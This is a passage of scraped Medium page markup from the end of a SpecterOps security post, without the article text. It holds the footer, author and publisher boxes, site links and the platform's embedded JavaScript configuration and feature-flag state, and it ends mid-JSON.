.35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg></button></div></div></div></div></div></div></div></div></div></footer><div class="si l"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="sj l"><div class="ab sk sl sm iz iy"><div class="sn so sp sq sr ss st su sv sw ab cp"><div class="h k"><a href="https://posts.specterops.io/?source=post_page---post_publication_info--c11f9b371811--------------------------------" rel="noopener follow"><div class="fj ab"><img alt="Posts By SpecterOps Team Members" class="sx ib ic cx" src="https://miro.medium.com/v2/resize:fill:96:96/1*D-FDlfkqivRBQZoESrwtqw.png" width="48" height="48" loading="lazy"/><div class="sx l ic ib fs n fr sy"></div></div></a></div><div class="j i d"><a href="https://posts.specterops.io/?source=post_page---post_publication_info--c11f9b371811--------------------------------" rel="noopener follow"><div class="fj ab"><img alt="Posts By SpecterOps Team Members" class="sx ta sz cx" src="https://miro.medium.com/v2/resize:fill:128:128/1*D-FDlfkqivRBQZoESrwtqw.png" width="64" height="64" loading="lazy"/><div class="sx l sz ta fs n fr sy"></div></div></a></div><div class="j i d tb ix"><div class="ab"><span><a class="bf b bg z tc rp td te tf tg th ev ew ti tj tk fa fb fc fd bm fe ff" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Fspecter-ops-posts&amp;operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fadfs-living-in-the-legacy-of-drs-c11f9b371811&amp;collection=Posts+By+SpecterOps+Team+Members&amp;collectionId=f05f8696e3cc&amp;source=post_page---post_publication_info--c11f9b371811---------------------follow_profile-----------" rel="noopener follow">Follow</a></span></div></div></div><div class="ab co tl"><div class="tm tn to tp tq l"><a class="af ag ah aj ak al am an ao ap aq ar as at ab q" href="https://posts.specterops.io/?source=post_page---post_publication_info--c11f9b371811--------------------------------" rel="noopener follow"><h2 class="pw-author-name bf ts tt tu tv tw tx ty nf tz ua nj ub uc nn ud ue bk"><span class="gn tr">Published in <!-- -->Posts By SpecterOps Team Members</span></h2></a><div class="rn ab ia"><div class="l ix"><span class="pw-follower-count bf b bg z du"><a class="af ag ah ai aj ak al am an ao ap aq ar iq" rel="noopener follow" href="/followers?source=post_page---post_publication_info--c11f9b371811--------------------------------">4.8K Followers</a></span></div><div class="bf b bg z du ab jb"><span class="ir l" aria-hidden="true"><span class="bf b bg z du">·</span></span><a class="af ag ah ai aj ak al am an ao ap aq ar iq" rel="noopener follow" href="/part-15-function-type-categories-5942e70e05ab?source=post_page---post_publication_info--c11f9b371811--------------------------------">Last published <!-- -->3 days ago</a></div></div><div class="uf l"><p class="bf b bg z bk"><span class="gn">Posts from SpecterOps team members on various topics relating information security</span></p></div></div></div><div class="h k"><div class="ab"><span><a class="bf b bg z tc rp td te tf tg th ev ew ti tj tk fa fb fc fd bm fe ff" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Fspecter-ops-posts&amp;operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fadfs-living-in-the-legacy-of-drs-c11f9b371811&amp;collection=Posts+By+SpecterOps+Team+Members&amp;collectionId=f05f8696e3cc&amp;source=post_page---post_publication_info--c11f9b371811---------------------follow_profile-----------" rel="noopener follow">Follow</a></span></div></div></div></div><div class="ab sk sl sm iz iy"><div class="sn so sp sq sr ss st su sv sw ab cp"><div class="h k"><a tabindex="0" href="https://medium.com/@xpnsec?source=post_page---post_author_info--c11f9b371811--------------------------------" rel="noopener follow"><div class="l fj"><img alt="Adam Chester" class="l fd by ic ib cx" src="https://miro.medium.com/v2/resize:fill:96:96/1*UTZD7k5oVTNVGjNXZjwpYw.jpeg" width="48" height="48" loading="lazy"/><div class="fr by l ic ib fs n ay sy"></div></div></a></div><div class="j i d"><a tabindex="0" href="https://medium.com/@xpnsec?source=post_page---post_author_info--c11f9b371811--------------------------------" rel="noopener follow"><div class="l fj"><img alt="Adam Chester" class="l fd by sz ta cx" src="https://miro.medium.com/v2/resize:fill:128:128/1*UTZD7k5oVTNVGjNXZjwpYw.jpeg" width="64" height="64" loading="lazy"/><div class="fr by l sz ta fs n ay sy"></div></div></a></div><div class="j i d tb ix"><div class="ab"><span><a class="bf b bg z tc rp td te tf tg th ev ew ti tj tk fa fb fc fd bm fe ff" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F94749d3f8afc&amp;operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fadfs-living-in-the-legacy-of-drs-c11f9b371811&amp;user=Adam+Chester&amp;userId=94749d3f8afc&amp;source=post_page-94749d3f8afc--post_author_info--c11f9b371811---------------------follow_profile-----------" rel="noopener follow">Follow</a></span></div></div></div><div class="ab co tl"><div class="tm tn to tp tq l"><a class="af ag ah aj ak al am an ao ap aq ar as at ab q" href="https://medium.com/@xpnsec?source=post_page---post_author_info--c11f9b371811--------------------------------" rel="noopener follow"><h2 class="pw-author-name bf ts tt tu tv tw tx ty nf tz ua nj ub uc nn ud ue bk"><span class="gn tr">Written by <!-- -->Adam Chester</span></h2></a><div class="rn ab ia"><div class="l ix"><span class="pw-follower-count bf b bg z du"><a class="af ag ah ai aj ak al am an ao ap aq ar iq" href="https://medium.com/@xpnsec/followers?source=post_page---post_author_info--c11f9b371811--------------------------------" rel="noopener follow">10 Followers</a></span></div><div class="bf b bg z du ab jb"><span class="ir l" aria-hidden="true"><span class="bf b bg z du">·</span></span><a class="af ag ah ai aj ak al am an ao ap aq ar iq" href="https://medium.com/@xpnsec/following?source=post_page---post_author_info--c11f9b371811--------------------------------" rel="noopener follow">1 Following</a></div></div><div class="uf l"><p class="bf b bg z bk">Hacker @ SpecterOps <a class="af ag ah ai aj ak al am an ao ap aq ar oz go" href="https://blog.xpnsec.com/" rel="noopener  ugc nofollow">https://blog.xpnsec.com/</a></p></div></div></div><div class="h k"><div class="ab"><span><a class="bf b bg z tc rp td te tf tg th ev ew ti tj tk fa fb fc fd bm fe ff" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F94749d3f8afc&amp;operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fadfs-living-in-the-legacy-of-drs-c11f9b371811&amp;user=Adam+Chester&amp;userId=94749d3f8afc&amp;source=post_page-94749d3f8afc--post_author_info--c11f9b371811---------------------follow_profile-----------" rel="noopener follow">Follow</a></span></div></div></div></div></div></div><div class="ug l"><div class="uh bh r si"></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab q cp"><h2 class="bf ts nz ob oc od of og oh oj ok ol on oo op or os bk">No responses yet</h2><div class="ab ui"><div><div class="bm" aria-hidden="false"><a class="uj uk" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page---post_responses--c11f9b371811--------------------------------" rel="noopener follow" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 25 25"><path fill-rule="evenodd" d="M11.987 5.036a.754.754 0 0 1 .914-.01c.972.721 1.767 1.218 2.6 1.543.828.322 1.719.485 2.887.505a.755.755 0 0 1 .741.757c-.018 3.623-.43 6.256-1.449 8.21-1.034 1.984-2.662 3.209-4.966 4.083a.75.75 0 0 1-.537-.003c-2.243-.874-3.858-2.095-4.897-4.074-1.024-1.951-1.457-4.583-1.476-8.216a.755.755 0 0 1 .741-.757c1.195-.02 2.1-.182 2.923-.503.827-.322 1.6-.815 2.519-1.535m.468.903c-.897.69-1.717 1.21-2.623 1.564-.898.35-1.856.527-3.026.565.037 3.45.469 5.817 1.36 7.515.884 1.684 2.25 2.762 4.284 3.571 2.092-.81 3.465-1.89 4.344-3.575.886-1.698 1.299-4.065 1.334-7.512-1.149-.039-2.091-.217-2.99-.567-.906-.353-1.745-.873-2.683-1.561m-.009 9.155a2.672 2.672 0 1 0 0-5.344 2.672 2.672 0 0 0 0 5.344m0 1a3.672 3.672 0 1 0 0-7.344 3.672 3.672 0 0 0 0 7.344m-1.813-3.777.525-.526.916.917 1.623-1.625.526.526-2.149 2.152z" clip-rule="evenodd"></path></svg></a></div></div></div></div><div class="ul um un uo up l"></div></div></div></div><div class="uq ur us ut uu l bx"><div class="h k j"><div class="uh bh uv uw"></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ux ab kt ja"><div class="uy uz l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://help.medium.com/hc/en-us?source=post_page-----c11f9b371811--------------------------------" rel="noopener follow"><p class="bf b dv z du">Help</p></a></div><div class="uy uz l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.statuspage.io/?source=post_page-----c11f9b371811--------------------------------" rel="noopener follow"><p class="bf b dv z du">Status</p></a></div><div class="uy uz l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/about?autoplay=1&amp;source=post_page-----c11f9b371811--------------------------------" rel="noopener follow"><p class="bf b dv z du">About</p></a></div><div class="uy uz l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----c11f9b371811--------------------------------" rel="noopener follow"><p class="bf b dv z du">Careers</p></a></div><div class="uy uz l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="pressinquiries@medium.com?source=post_page-----c11f9b371811--------------------------------" rel="noopener follow"><p class="bf b dv z du">Press</p></a></div><div class="uy uz l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://blog.medium.com/?source=post_page-----c11f9b371811--------------------------------" rel="noopener follow"><p class="bf b dv z du">Blog</p></a></div><div class="uy uz l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----c11f9b371811--------------------------------" rel="noopener follow"><p class="bf b dv z du">Privacy</p></a></div><div class="uy uz l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----c11f9b371811--------------------------------" rel="noopener follow"><p class="bf b dv z du">Terms</p></a></div><div class="uy uz l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://speechify.com/medium?source=post_page-----c11f9b371811--------------------------------" rel="noopener follow"><p class="bf b dv z du">Text to speech</p></a></div><div class="uy l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/business?source=post_page-----c11f9b371811--------------------------------" rel="noopener follow"><p class="bf b dv z du">Teams</p></a></div></div></div></div></div></div></div></div></div></div><script>window.__BUILD_ID__="main-20250110-154215-d58a2d1ab2"</script><script>window.__GRAPHQL_URI__ = "https://posts.specterops.io/_/graphql"</script><script>window.__PRELOADED_STATE__ = {"algolia":{"queries":{}},"cache":{"experimentGroupSet":true,"reason":"This request is not using the cache middleware worker","group":"disabled","tags":["group-edgeCachePosts","post-c11f9b371811","user-94749d3f8afc","collection-f05f8696e3cc"],"serverVariantState":"","middlewareEnabled":false,"cacheStatus":"DYNAMIC","shouldUseCache":false,"vary":[],"lohpSummerUpsellEnabled":false},"client":{"hydrated":false,"isUs":false,"isNativeMedium":false,"isSafariMobile":false,"isSafari":false,"isFirefox":false,"routingEntity":{"type":"COLLECTION","id":"f05f8696e3cc","explicit":true},"viewerIsBot":false},"debug":{"requestId":"1c29240f-788b-487c-b9e0-c1735beccf10","requestTag":"","hybridDevServices":[],"originalSpanCarrier":{"traceparent":"00-ce7dea3274af3d6440f61323dc25a23a-b3a168e8a79db955-01"}},"multiVote":{"clapsPerPost":{}},"navigation":{"branch":{"show":null,"hasRendered":null,"blockedByCTA":false},"hideGoogleOneTap":false,"hasRenderedAlternateUserBanner":null,"currentLocation":"https:\u002F\u002Fposts.specterops.io\u002Fadfs-living-in-the-legacy-of-drs-c11f9b371811","host":"posts.specterops.io","hostname":"posts.specterops.io","referrer":"","hasSetReferrer":false,"susiModal":{"step":null,"operation":"register"},"postRead":false,"partnerProgram":{"selectedCountryCode":null},"queryString":"?source=rss----f05f8696e3cc---4"},"config":{"nodeEnv":"production","version":"main-20250110-154215-d58a2d1ab2","target":"production","productName":"Medium","publicUrl":"https:\u002F\u002Fcdn-client.medium.com\u002Flite","authDomain":"medium.com","authGoogleClientId":"216296035834-k1k6qe060s2tp2a2jam4ljdcms00sttg.apps.googleusercontent.com","favicon":"production","glyphUrl":"https:\u002F\u002Fglyph.medium.com","branchKey":"key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm","algolia":{"appId":"MQ57UUUQZ2","apiKeySearch":"394474ced050e3911ae2249ecc774921","indexPrefix":"medium_","host":"-dsn.algolia.net"},"recaptchaKey":"6Lfc37IUAAAAAKGGtC6rLS13R1Hrw_BqADfS1LRk","recaptcha3Key":"6Lf8R9wUAAAAABMI_85Wb8melS7Zj6ziuf99Yot5","recaptchaEnterpriseKeyId":"6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp","datadog":{"applicationId":"6702d87d-a7e0-42fe-bbcb-95b469547ea0","clientToken":"pub853ea8d17ad6821d9f8f11861d23dfed","rumToken":"pubf9cc52896502b9413b68ba36fc0c7162","context":{"deployment":{"target":"production","tag":"main-20250110-154215-d58a2d1ab2","commit":"d58a2d1ab2df37007c05f758ad444c4fe1e39591"}},"datacenter":"us"},"googleAnalyticsCode":"G-7JY7T788PK","googlePay":{"apiVersion":"2","apiVersionMinor":"0","merchantId":"BCR2DN6TV7EMTGBM","merchantName":"Medium","instanceMerchantId":"13685562959212738550"},"applePay":{"version":3},"signInWallCustomDomainCollectionIds":["3a8144eabfe3","336d898217ee","61061eb0c96b","138adf9c44c","819cc2aaeee0"],"mediumMastodonDomainName":"me.dm","mediumOwnedAndOperatedCollectionIds":["8a9336e5bb4","b7e45b22fec3","193b68bd4fba","8d6b8a439e32","54c98c43354d","3f6ecf56618","d944778ce714","92d2092dc598","ae2a65f35510","1285ba81cada","544c7006046e","fc8964313712","40187e704f1c","88d9857e584e","7b6769f2748b","bcc38c8f6edf","cef6983b292","cb8577c9149e","444d13b52878","713d7dbc99b0","ef8e90590e66","191186aaafa0","55760f21cdc5","9dc80918cc93","bdc4052bbdba","8ccfed20cbb2"],"tierOneDomains":["medium.com","thebolditalic.com","arcdigital.media","towardsdatascience.com","uxdesign.cc","codeburst.io","psiloveyou.xyz","writingcooperative.com","entrepreneurshandbook.co","prototypr.io","betterhumans.coach.me","theascent.pub"],"topicsToFollow":["d61cf867d93f","8a146bc21b28","1eca0103fff3","4d562ee63426","aef1078a3ef5","e15e46793f8d","6158eb913466","55f1c20aba7a","3d18b94f6858","4861fee224fd","63c6f1f93ee","1d98b3a9a871","decb52b64abf","ae5d4995e225","830cded25262"],"topicToTagMappings":{"accessibility":"accessibility","addiction":"addiction","android-development":"android-development","art":"art","artificial-intelligence":"artificial-intelligence","astrology":"astrology","basic-income":"basic-income","beauty":"beauty","biotech":"biotech","blockchain":"blockchain","books":"books","business":"business","cannabis":"cannabis","cities":"cities","climate-change":"climate-change","comics":"comics","coronavirus":"coronavirus","creativity":"creativity","cryptocurrency":"cryptocurrency","culture":"culture","cybersecurity":"cybersecurity","data-science":"data-science","design":"design","digital-life":"digital-life","disability":"disability","economy":"economy","education":"education","equality":"equality","family":"family","feminism":"feminism","fiction":"fiction","film":"film","fitness":"fitness","food":"food","freelancing":"freelancing","future":"future","gadgets":"gadgets","gaming":"gaming","gun-control":"gun-control","health":"health","history":"history","humor":"humor","immigration":"immigration","ios-development":"ios-development","javascript":"javascript","justice":"justice","language":"language","leadership":"leadership","lgbtqia":"lgbtqia","lifestyle":"lifestyle","machine-learning":"machine-learning","makers":"makers","marketing":"marketing","math":"math","media":"media","mental-health":"mental-health","mindfulness":"mindfulness","money":"money","music":"music","neuroscience":"neuroscience","nonfiction":"nonfiction","outdoors":"outdoors","parenting":"parenting","pets":"pets","philosophy":"philosophy","photography":"photography","podcasts":"podcast","poetry":"poetry","politics":"politics","privacy":"privacy","product-management":"product-management","productivity":"productivity","programming":"programming","psychedelics":"psychedelics","psychology":"psychology","race":"race","relationships":"relationships","religion":"religion","remote-work":"remote-work","san-francisco":"san-francisco","science":"science","self":"self","self-driving-cars":"self-driving-cars","sexuality":"sexuality","social-media":"social-media","society":"society","software-engineering":"software-engineering","space":"space","spirituality":"spirituality","sports":"sports","startups":"startup","style":"style","technology":"technology","transportation":"transportation","travel":"travel","true-crime":"true-crime","tv":"tv","ux":"ux","venture-capital":"venture-capital","visual-design":"visual-design","work":"work","world":"world","writing":"writing"},"defaultImages":{"avatar":{"imageId":"1*dmbNkD5D-u45r44go_cf0g.png","height":150,"width":150},"orgLogo":{"imageId":"7*V1_7XP4snlmqrc_0Njontw.png","height":110,"width":500},"postLogo":{"imageId":"bd978bb536350a710e8efb012513429cabdc4c28700604261aeda246d0f980b7","height":810,"width":1440},"postPreviewImage":{"imageId":"1*hn4v1tCaJy7cWMyb0bpNpQ.png","height":386,"width":579}},"collectionStructuredData":{"8d6b8a439e32":{"name":"Elemental","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F980\u002F1*9ygdqoKprhwuTVKUM0DLPA@2x.png","width":980,"height":159}}},"3f6ecf56618":{"name":"Forge","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F596\u002F1*uULpIlImcO5TDuBZ6lm7Lg@2x.png","width":596,"height":183}}},"ae2a65f35510":{"name":"GEN","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F264\u002F1*RdVZMdvfV3YiZTw6mX7yWA.png","width":264,"height":140}}},"88d9857e584e":{"name":"LEVEL","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*JqYMhNX6KNNb2UlqGqO2WQ.png","width":540,"height":108}}},"7b6769f2748b":{"name":"Marker","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F383\u002F1*haCUs0wF6TgOOvfoY-jEoQ@2x.png","width":383,"height":92}}},"444d13b52878":{"name":"OneZero","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*cw32fIqCbRWzwJaoQw6BUg.png","width":540,"height":123}}},"8ccfed20cbb2":{"name":"Zora","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*tZUQqRcCCZDXjjiZ4bDvgQ.png","width":540,"height":106}}}},"embeddedPostIds":{"coronavirus":"cd3010f9d81f"},"sharedCdcMessaging":{"COVID_APPLICABLE_TAG_SLUGS":[],"COVID_APPLICABLE_TOPIC_NAMES":[],"COVID_APPLICABLE_TOPIC_NAMES_FOR_TOPIC_PAGE":[],"COVID_MESSAGES":{"tierA":{"text":"For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":66,"end":73,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"tierB":{"text":"Anyone can publish on Medium per our Policies, but we don’t fact-check every story. For more info about the coronavirus, see cdc.gov.","markups":[{"start":37,"end":45,"href":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Fcategories\u002F201931128-Policies-Safety"},{"start":125,"end":132,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"paywall":{"text":"This article has been made free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":56,"end":70,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":138,"end":145,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"unbound":{"text":"This article is free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":45,"end":59,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":127,"end":134,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]}},"COVID_BANNER_POST_ID_OVERRIDE_WHITELIST":["3b31a67bff4a"]},"sharedVoteMessaging":{"TAGS":["politics","election-2020","government","us-politics","election","2020-presidential-race","trump","donald-trump","democrats","republicans","congress","republican-party","democratic-party","biden","joe-biden","maga"],"TOPICS":["politics","election"],"MESSAGE":{"text":"Find out more about the U.S. election results here.","markups":[{"start":46,"end":50,"href":"https:\u002F\u002Fcookpolitical.com\u002F2020-national-popular-vote-tracker"}]},"EXCLUDE_POSTS":["397ef29e3ca5"]},"embedPostRules":[],"recircOptions":{"v1":{"limit":3},"v2":{"limit":8}},"braintreeClientKey":"production_zjkj96jm_m56f8fqpf7ngnrd4","braintree":{"enabled":true,"merchantId":"m56f8fqpf7ngnrd4","merchantAccountId":{"usd":"AMediumCorporation_instant","eur":"amediumcorporation_EUR","cad":"amediumcorporation_CAD"},"publicKey":"ds2nn34bg2z7j5gd","braintreeEnvironment":"production","dashboardUrl":"https:\u002F\u002Fwww.braintreegateway.com\u002Fmerchants","gracePeriodDurationInDays":14,"mediumMembershipPlanId":{"monthly":"ce105f8c57a3","monthlyV2":"e8a5e126-792b-4ee6-8fba-d574c1b02fc5","monthlyWithTrial":"d5ee3dbe3db8","monthlyPremium":"fa741a9b47a2","yearly":"a40ad4a43185","yearlyV2":"3815d7d6-b8ca-4224-9b8c-182f9047866e","yearlyStaff":"d74fb811198a","yearlyWithTrial":"b3bc7350e5c7","yearlyPremium":"e21bd2c12166","monthlyOneYearFree":"e6c0637a-2bad-4171-ab4f-3c268633d83c","monthly25PercentOffFirstYear":"235ecc62-0cdb-49ae-9378-726cd21c504b","monthly20PercentOffFirstYear":"ba518864-9c13-4a99-91ca-411bf0cac756","monthly15PercentOffFirstYear":"594c029b-9f89-43d5-88f8-8173af4e070e","monthly10PercentOffFirstYear":"c6c7bc9a-40f2-4b51-8126-e28511d5bdb0","monthlyForStudents":"629ebe51-da7d-41fd-8293-34cd2f2030a8","yearlyOneYearFree":"78ba7be9-0d9f-4ece-aa3e-b54b826f2bf1","yearly25PercentOffFirstYear":"2dbb010d-bb8f-4eeb-ad5c-a08509f42d34","yearly20PercentOffFirstYear":"47565488-435b-47f8-bf93-40d5fbe0ebc8","yearly15PercentOffFirstYear":"8259809b-0881-47d9-acf7-6c001c7f720f","yearly10PercentOffFirstYear":"9dd694fb-96e1-472c-8d9e-3c868d5c1506","yearlyForStudents":"e29345ef-ab1c-4234-95c5-70e50fe6bc23","monthlyCad":"p52orjkaceei","yearlyCad":"h4q9g2up9ktt"},"braintreeDiscountId":{"oneMonthFree":"MONTHS_FREE_01","threeMonthsFree":"MONTHS_FREE_03","sixMonthsFree":"MONTHS_FREE_06","fiftyPercentOffOneYear":"FIFTY_PERCENT_OFF_ONE_YEAR"},"3DSecureVersion":"2","defaultCurrency":"usd","providerPlanIdCurrency":{"4ycw":"usd","rz3b":"usd","3kqm":"usd","jzw6":"usd","c2q2":"usd","nnsw":"usd","q8qw":"usd","d9y6":"usd","fx7w":"cad","nwf2":"cad"}},"paypalClientId":"AXj1G4fotC2GE8KzWX9mSxCH1wmPE3nJglf4Z2ig_amnhvlMVX87otaq58niAg9iuLktVNF_1WCMnN7v","paypal":{"host":"https:\u002F\u002Fapi.paypal.com:443","clientMode":"production","serverMode":"live","webhookId":"4G466076A0294510S","monthlyPlan":{"planId":"P-9WR0658853113943TMU5FDQA","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlan":{"planId":"P-7N8963881P8875835MU5JOPQ","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oneYearGift":{"name":"Medium Membership (1 Year, Digital Gift Code)","description":"Unlimited access to the best and brightest stories on Medium. Gift codes can be redeemed at medium.com\u002Fredeem.","price":"50.00","currency":"USD","sku":"membership-gift-1-yr"},"oldMonthlyPlan":{"planId":"P-96U02458LM656772MJZUVH2Y","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlan":{"planId":"P-59P80963JF186412JJZU3SMI","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"monthlyPlanWithTrial":{"planId":"P-66C21969LR178604GJPVKUKY","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlanWithTrial":{"planId":"P-6XW32684EX226940VKCT2MFA","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oldMonthlyPlanNoSetupFee":{"planId":"P-4N046520HR188054PCJC7LJI","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlanNoSetupFee":{"planId":"P-7A4913502Y5181304CJEJMXQ","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"sdkUrl":"https:\u002F\u002Fwww.paypal.com\u002Fsdk\u002Fjs"},"stripePublishableKey":"pk_live_7FReX44VnNIInZwrIIx6ghjl","log":{"json":true,"level":"info"},"imageUploadMaxSizeMb":25,"staffPicks":{"title":"Staff Picks","catalogId":"c7bc6e1ee00f"}},"session":{"xsrf":""}}</script><script>window.__APOLLO_STATE__ = {"ROOT_QUERY":{"__typename":"Query","viewer":null,"variantFlags":[{"__typename":"VariantFlag","name":"enable_braintree_apple_pay","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"mobile_custom_app_icon","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_ios_dynamic_paywall_aspiriational","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_enable_verified_book_author","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"available_annual_plan","valueType":{"__typename":"VariantFlagString","value":"2c754bcc2995"}},{"__typename":"VariantFlag","name":"enable_lo_homepage","valueType":{"__typename":"VariantFlagString","value":"control"}},{"__typename":"VariantFlag","name":"android_enable_syntax_highlight","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_bg_post_post","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_mastodon_for_members","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"redefined_top_posts","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_abandoned_paywall_promotion_email","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_rex_new_push_notification_endpoint","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"signin_services","valueType":{"__typename":"VariantFlagString","value":"twitter,facebook,google,email,google-fastidv,google-one-tap,apple"}},{"__typename":"VariantFlag","name":"android_enable_image_sharer","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_recaptcha_enterprise","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_speechify_ios","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"coronavirus_topic_recirc","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"rex_generator_max_candidates","valueType":{"__typename":"VariantFlagNumber","value":1000}},{"__typename":"VariantFlag","name":"ios_enable_friend_links_creation","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_branch_io","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_braintree_client","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_moc_load_processor_first_story","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_premium_tier","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"can_send_tips_v0","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_post_bottom_responses_input","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantF